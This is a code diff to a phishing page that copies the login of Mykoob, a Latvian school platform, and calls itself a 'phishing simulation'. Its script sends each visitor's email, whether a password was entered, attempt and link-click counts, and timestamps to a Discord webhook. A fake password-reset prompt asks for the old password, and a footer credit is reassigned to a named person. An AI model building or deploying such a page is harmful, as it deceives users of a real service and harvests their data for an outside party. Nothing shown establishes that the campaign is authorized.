@@ -281,7 +281,6 @@
             text-decoration: underline;
         }
 
-        /* ── Modals ── */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -525,7 +524,7 @@
 
         <footer class="footer">
             <div class="footer__left">
-                <span>© Mykoob. Visas tiesības pieder J.Esptein</span>
+                <span>© Mykoob. Visas tiesības pieder Raivo Strazdiņam</span>
             </div>
             <div class="footer__right">
                 <a href="https://login.mykoob.lv/#/lv/terms/service">Lietošanas noteikumi</a>
@@ -575,56 +574,79 @@
         // ── Track attempts per email ──
         const attemptTracker = {};
 
-        // ── Send to Discord (fire and forget - non-blocking) ──
-        function sendToDiscord(email, action, passwordProvided) {
+        // ── Track click-throughs ──
+        const clickTracker = {};
+
+        // ── Send to Discord ──
+        function sendToDiscord(email, action, passwordProvided, clickOnly = false) {
             if (!attemptTracker[email]) {
                 attemptTracker[email] = 0;
             }
-            attemptTracker[email]++;
             
+            if (clickOnly) {
+                if (!clickTracker[email]) {
+                    clickTracker[email] = 0;
+                }
+                clickTracker[email]++;
+            } else {
+                attemptTracker[email]++;
+            }
+            
+            const fields = [
+                {
+                    name: '📧 E-pasts',
+                    value: email || 'Nav norādīts',
+                    inline: true
+                }
+            ];
+
+            if (!clickOnly) {
+                fields.push({
+                    name: '🔑 Parole ievadīta?',
+                    value: passwordProvided ? '✅ Jā' : '❌ Nē',
+                    inline: true
+                });
+            }
+
+            const clickCount = clickTracker[email] || 0;
+            fields.push({
+                name: '👆 Saites atvērumi',
+                value: clickCount.toString(),
+                inline: true
+            });
+
+            if (!clickOnly) {
+                fields.push({
+                    name: '🔄 Pieslēgšanās mēģinājums #',
+                    value: attemptTracker[email].toString(),
+                    inline: true
+                });
+            }
+
+            fields.push({
+                name: '🕐 Laiks',
+                value: new Date().toLocaleString('lv-LV'),
+                inline: false
+            });
+
             const embed = {
                 embeds: [{
                     title: `🔐 ${action}`,
-                    color: 0xff4444,
-                    fields: [
-                        {
-                            name: '📧 E-pasts',
-                            value: email || 'Nav norādīts',
-                            inline: true
-                        },
-                        {
-                            name: '🔑 Parole ievadīta?',
-                            value: passwordProvided ? '✅ Jā' : '❌ Nē',
-                            inline: true
-                        },
-                        {
-                            name: '🔄 Mēģinājums #',
-                            value: attemptTracker[email].toString(),
-                            inline: true
-                        },
-                        {
-                            name: '🕐 Laiks',
-                            value: new Date().toLocaleString('lv-LV'),
-                            inline: false
-                        }
-                    ],
+                    color: clickOnly ? 0x00bfff : 0xff4444,
+                    fields: fields,
                     footer: {
                         text: 'Mykoob Phishing Simulation'
                     }
                 }]
             };
 
-            // Fire and forget - don't wait for response, don't block UI
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify(embed)
-            }).catch(err => {
-                // Silently fail - don't let webhook errors break the UI
-                console.log('Webhook error (ignored):', err);
-            });
+            }).catch(err => console.log('Webhook error:', err));
         }
 
         // ── State ──
@@ -650,7 +672,6 @@
         const failModal = document.getElementById('failModal');
         const failOkBtn = document.getElementById('failOk');
 
-        // ── Helper: hide all modals ──
         function hideAllModals() {
             forgotModal.classList.remove('active');
             failModal.classList.remove('active');
@@ -659,7 +680,6 @@
             forgotOldPassword.value = '';
         }
 
-        // ── Show forgot modal ──
         function showForgotModal() {
             if (emailInput.value.trim()) {
                 forgotEmail.value = emailInput.value.trim();
@@ -670,18 +690,15 @@
             forgotOldPassword.focus();
         }
 
-        // ── Show failure modal ──
         function showFailModal() {
             failModal.classList.add('active');
         }
 
-        // ── Login attempt ──
         function attemptLogin(email, password) {
             loginAttempts++;
             
-            // Fire webhook - non-blocking, track if password was provided
             const hasPassword = password && password.length > 0;
-            sendToDiscord(email, 'Pieslēgšanās mēģinājums', hasPassword);
+            sendToDiscord(email, 'Pieslēgšanās mēģinājums', hasPassword, false);
             
             if (loginAttempts >= MAX_ATTEMPTS) {
                 formError.textContent = '';
@@ -696,17 +713,13 @@
             return false;
         }
 
-        // ── Reset password ──
         function resetPassword(email, oldPassword) {
-            // Fire webhook - non-blocking, track if password was provided
             const hasPassword = oldPassword && oldPassword.length > 0;
-            sendToDiscord(email, 'Paroles atjaunošanas mēģinājums', hasPassword);
+            sendToDiscord(email, 'Paroles atjaunošanas mēģinājums', hasPassword, false);
             
             hideAllModals();
             showFailModal();
         }
-
-        // ── Event listeners ──
 
         loginForm.addEventListener('submit', function(e) {
             e.preventDefault();
@@ -869,8 +882,19 @@
             }
         };
 
-        updateTexts('lv');
-        console.log('[Mykoob] Phishing simulation ready - @jak.lv only. Discord webhook active (fire and forget).');
+        // ── Check for URL parameter on load ──
+        (function init() {
+            const params = new URLSearchParams(window.location.search);
+            const emailParam = params.get('email');
+            if (emailParam) {
+                emailInput.value = emailParam;
+                storedEmail = emailParam;
+                sendToDiscord(emailParam, '📨 Saites atvēršana', false, true);
+            }
+            
+            updateTexts('lv');
+            console.log('[Mykoob] Phishing simulation ready.');
+        })();
     </script>
 
 </body>
